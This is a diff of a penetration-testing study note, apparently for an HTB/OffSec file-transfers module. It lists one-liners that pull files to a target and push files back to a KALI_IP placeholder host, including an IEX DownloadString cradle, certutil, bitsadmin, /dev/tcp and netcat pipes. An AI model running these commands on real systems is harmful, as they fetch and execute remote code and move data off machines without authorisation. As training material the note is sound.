@@ -2,7 +2,7 @@
 
 #FileTransfers #Windows #Linux #PowerShell #iwr #certutil #scp #netcat #BitsTransfer #WebClient #RDP #LOLBAS #GTFOBins #HTBSupplementary
 
-**HTB File Transfers module** — supplementary reference note. The Offsec modules scatter file transfer one-liners throughout their labs (iwr in Windows PrivEsc, python3 http.server in Client-Side Attacks, scp in Linux PrivEsc, xfreerdp /drive: in Antivirus Evasion). This note consolidates all methods in one scannable cheat sheet and adds the few genuinely new ones (DownloadFile, nc pipe, BitsTransfer, Python urlretrieve).
+**HTB File Transfers module**, supplementary reference note. The Offsec modules scatter file transfer one-liners throughout their labs (iwr in Windows PrivEsc, python3 http.server in Client-Side Attacks, scp in Linux PrivEsc, xfreerdp /drive: in Antivirus Evasion). This note consolidates all methods in one scannable cheat sheet and adds the few genuinely new ones (DownloadFile, nc pipe, BitsTransfer, Python urlretrieve).
 
 > 🔁 Cross-refs: [[Windows Privilege Escalation]] (iwr + certutil in lab steps), [[Antivirus Evasion]] (xfreerdp /drive: with tsclient note), [[Linux Privilege Escalation]] (scp in exploit transfer steps), [[Client-Side Attacks]] (WebClient download cradle), [[Port Redirection and SSH Tunneling]] (nc FIFO pipe)
 
@@ -25,7 +25,7 @@ python3 -m http.server 80 --bind 0.0.0.0
 ls -la
 ```
 
-> 🔧 Technique: always `cd` to the directory with the file first, not just specify a path. Python's HTTP server doesn't support path arguments by default — it serves from the CWD only.
+> 🔧 Technique: always `cd` to the directory with the file first, not just specify a path. Python's HTTP server doesn't support path arguments by default, it serves from the CWD only.
 
 > 🔧 Technique: if port 80 requires root (`sudo`), use 8080 instead and adjust the download commands accordingly.
 
@@ -37,7 +37,7 @@ ls -la
 
 ---
 
-**PowerShell: iwr (Invoke-WebRequest)** — most common in practice:
+**PowerShell: iwr (Invoke-WebRequest)**, most common in practice:
 ```powershell
 iwr http://KALI_IP/file.exe -OutFile file.exe
 iwr http://KALI_IP/file.exe -OutFile "C:\Users\user\Desktop\file.exe"
@@ -48,7 +48,7 @@ wget http://KALI_IP/file.txt -OutFile flag.txt
 
 ---
 
-**PowerShell: WebClient.DownloadFile** — saves to disk (different from DownloadString which executes in memory):
+**PowerShell: WebClient.DownloadFile**, saves to disk (different from DownloadString which executes in memory):
 ```powershell
 # Save to disk
 (New-Object System.Net.WebClient).DownloadFile('http://KALI_IP/file.exe', 'C:\Users\user\file.exe')
@@ -68,7 +68,7 @@ IEX (New-Object System.Net.WebClient).DownloadString('http://KALI_IP/script.ps1'
 
 ---
 
-**LOLBAS: certutil** — built-in Windows binary, no PowerShell required:
+**LOLBAS: certutil**, built-in Windows binary, no PowerShell required:
 ```cmd
 certutil -urlcache -split -f http://KALI_IP/file.exe file.exe
 ```
@@ -78,7 +78,7 @@ certutil -urlcache -split -f http://KALI_IP/file.exe file.exe
 
 ---
 
-**LOLBAS: bitsadmin** — Background Intelligent Transfer Service, throttleable and resumable:
+**LOLBAS: bitsadmin**. Background Intelligent Transfer Service, throttleable and resumable:
 ```cmd
 bitsadmin /transfer job /download /priority normal http://KALI_IP/file.exe C:\path\file.exe
 ```
@@ -86,7 +86,7 @@ BITS is a legitimate Windows update delivery mechanism. Transfers survive reboot
 
 ---
 
-**PowerShell: Start-BitsTransfer** — PowerShell wrapper for BITS:
+**PowerShell: Start-BitsTransfer**. PowerShell wrapper for BITS:
 ```powershell
 Start-BitsTransfer -Source http://KALI_IP/file.exe -Destination C:\path\file.exe
 
@@ -96,7 +96,7 @@ Start-BitsTransfer -Source C:\path\file.txt -Destination http://KALI_IP:PORT/upl
 
 ---
 
-**PowerShell: Expand-Archive** — extract a zip file (no WinZip/7-Zip required):
+**PowerShell: Expand-Archive**, extract a zip file (no WinZip/7-Zip required):
 ```powershell
 Expand-Archive .\archive.zip                     # extracts to .\archive\ subdirectory
 Expand-Archive .\archive.zip -DestinationPath C:\target\dir   # extract to specific path
@@ -155,9 +155,9 @@ iwr -Uri http://KALI_IP:8080/upload -Method POST -InFile C:\path\file.txt
 upload /home/kali/file.exe C:\Users\user\file.exe
 download C:\Users\user\flag.txt /home/kali/flag.txt
 ```
-No HTTP server needed — transfers happen over the WinRM connection itself (port 5985).
+No HTTP server needed, transfers happen over the WinRM connection itself (port 5985).
 
-> 🔁 Similar to: [[Windows Privilege Escalation#17.3.1|17.3.1]] — evil-winrm upload used to plant BackendCacheCleanup.exe replacing the scheduled task binary
+> 🔁 Similar to: [[Windows Privilege Escalation#17.3.1|17.3.1]], evil-winrm upload used to plant BackendCacheCleanup.exe replacing the scheduled task binary
 
 ---
 
@@ -171,7 +171,7 @@ No HTTP server needed — transfers happen over the WinRM connection itself (por
 
 ---
 
-**wget** — most common:
+**wget**, most common:
 ```bash
 wget http://KALI_IP/file
 wget http://KALI_IP/file -O /path/to/save/file   # -O = output filename/path
@@ -209,7 +209,7 @@ exec 3<>/dev/tcp/KALI_IP/80
 echo -e "GET /file HTTP/1.1\r\nHost: KALI_IP\r\nConnection: close\r\n\r\n" >&3
 cat <&3 > file
 ```
-Raw TCP, no tools needed, just bash. The response includes HTTP headers before the file content — strip them if needed.
+Raw TCP, no tools needed, just bash. The response includes HTTP headers before the file content, strip them if needed.
 
 ---
 
@@ -246,7 +246,7 @@ scp /path/to/file kali@KALI_IP:~/
 
 ---
 
-**nc (netcat) file pipe** — useful when SSH isn't available:
+**nc (netcat) file pipe**, useful when SSH isn't available:
 
 On **target (receiver):**
 ```bash
@@ -271,7 +271,7 @@ On **target (sender):**
 nc -w 3 KALI_IP 9999 < file_to_send
 ```
 
-> 🔧 Technique: there's no progress indicator or confirmation with nc file pipes. Verify integrity after transfer with `md5sum file` on both sides and compare. `md5sum localfile` on Kali, `md5sum received_file` on target — values should match.
+> 🔧 Technique: there's no progress indicator or confirmation with nc file pipes. Verify integrity after transfer with `md5sum file` on both sides and compare. `md5sum localfile` on Kali, `md5sum received_file` on target, values should match.
 
 > 🔧 Technique: if the target has a firewall blocking outbound connections, flip the direction: target listens, Kali connects. If it blocks inbound too, use an existing open port (e.g. port 80 or 443 on a service you're not using).
 
@@ -294,7 +294,7 @@ curl -F 'files=@/path/to/file' http://KALI_IP:8080/upload
 
 ## FT.6. RDP File Transfer (xfreerdp Drive Mount)
 
-When you have RDP access to a Windows target, mounting a local Kali directory over the RDP session is often the cleanest file transfer method. No HTTP server, no credentials beyond RDP — files appear as a network drive inside Windows.
+When you have RDP access to a Windows target, mounting a local Kali directory over the RDP session is often the cleanest file transfer method. No HTTP server, no credentials beyond RDP, files appear as a network drive inside Windows.
 
 ```bash
 # Connect with /drive: flag to mount a local directory
@@ -385,4 +385,4 @@ flowchart TD
 - [x] FT.6. RDP Drive Mount (xfreerdp /drive:, rdesktop)
 - [x] FT.7. Decision Flow Diagram
 - [x] FT.8. Skills Assessment Answers
-- All section Q&A covered — no separate VM labs beyond the practice exercises (DONE answers)
+- All section Q&A covered, no separate VM labs beyond the practice exercises (DONE answers)
